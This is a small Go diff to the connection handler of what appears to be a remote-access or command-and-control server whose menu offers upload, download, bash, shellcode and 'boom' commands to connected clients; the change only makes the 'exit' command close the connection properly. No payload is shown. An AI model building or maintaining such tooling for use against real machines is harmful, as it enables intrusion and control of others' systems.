@@ -68,6 +68,7 @@ func handleClient(conn net.Conn) {
 	printHelp()
 	fmt.Println("Connection established.")
 	fmt.Println("Commands: upload, download, boom, bash, exit, help, shellcode.\n")
+	cleanup := func() { _ = conn.Close() }
 	for true {
 		fmt.Printf("[SERVER] %s [>_] $ ", conn.RemoteAddr().String())
 		useript := utils.ReadUserInput()
@@ -218,12 +219,13 @@ func handleClient(conn net.Conn) {
 				continue
 			}
 		case "exit":
-			break
+			cleanup()
+			return
 		case "help":
 			fallthrough
 		default:
 			printHelp()
 		}
 	}
-	defer func() { _ = conn.Close() }()
+	defer cleanup()
 }
